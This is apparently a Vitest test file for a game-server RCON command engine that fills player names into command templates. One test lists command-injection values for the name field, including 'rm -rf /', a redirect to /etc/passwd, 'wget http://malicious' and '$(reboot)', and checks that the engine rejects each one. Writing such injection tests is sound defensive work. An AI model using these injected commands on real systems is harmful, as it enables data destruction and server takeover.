import { describe, it, expect, vi } from 'vitest';
import { ExecutionEngine, type IInstanceCommandSender } from '../ExecutionEngine.js';

describe('ExecutionEngine', () => {
  it('should correctly substitute variables and execute when pattern is allowed', async () => {
    const mockSender: IInstanceCommandSender = {
      sendCommand: vi.fn().mockResolvedValue('ok'),
    };
    const engine = new ExecutionEngine(mockSender);

    const result = await engine.executeLogic('inst-1', 'give {PlayerName} 10', { PlayerName: 'Alice_123' });
    
    expect(result).toBe(true);
    expect(mockSender.sendCommand).toHaveBeenCalledWith('inst-1', 'give Alice_123 10');
  });

  it('should block malicious payloads containing special characters and pipes', async () => {
    const mockSender: IInstanceCommandSender = {
      sendCommand: vi.fn(),
    };
    const engine = new ExecutionEngine(mockSender);

    // 恶意注入测试用例
    const maliciousPayloads = [
      { logic: 'give {PlayerName} 10', vars: { PlayerName: 'Alice; stop' } }, // 分号注入
      { logic: 'give {PlayerName} 10', vars: { PlayerName: 'Alice | rm -rf /' } }, // 管道符注入
      { logic: 'give {PlayerName} 10', vars: { PlayerName: 'Alice > /etc/passwd' } }, // 重定向符注入
      { logic: 'give {PlayerName} 10', vars: { PlayerName: 'Alice && wget http://malicious' } }, // 逻辑与注入
      { logic: 'give {PlayerName} 10', vars: { PlayerName: 'Alice $(reboot)' } }, // 命令替换注入
      { logic: 'give {PlayerName} 10', vars: { PlayerName: 'Alice \n stop' } }, // 换行符注入
    ];

    for (const { logic, vars } of maliciousPayloads) {
      await expect(engine.executeLogic('inst-1', logic, vars)).rejects.toThrow('ERR_RCON_INJECTION');
    }

    expect(mockSender.sendCommand).not.toHaveBeenCalled();
  });

  it('should keep variable format if variable is missing in vars map', async () => {
    const mockSender: IInstanceCommandSender = {
      sendCommand: vi.fn().mockResolvedValue('ok'),
    };
    const engine = new ExecutionEngine(mockSender);

    // 缺少 {ItemName}，将保持原样，由于 { } 也在默认白名单中，所以可以通过校验
    const result = await engine.executeLogic('inst-1', 'give {PlayerName} {ItemName}', { PlayerName: 'Alice' });
    
    expect(result).toBe(true);
    expect(mockSender.sendCommand).toHaveBeenCalledWith('inst-1', 'give Alice {ItemName}');
  });

  it('should throw ERR_EXECUTION_FAILED if sendCommand fails', async () => {
    const mockSender: IInstanceCommandSender = {
      sendCommand: vi.fn().mockRejectedValue(new Error('Connection lost')),
    };
    const engine = new ExecutionEngine(mockSender);

    await expect(engine.executeLogic('inst-1', 'give Alice 10', {})).rejects.toThrow('ERR_EXECUTION_FAILED');
  });
});
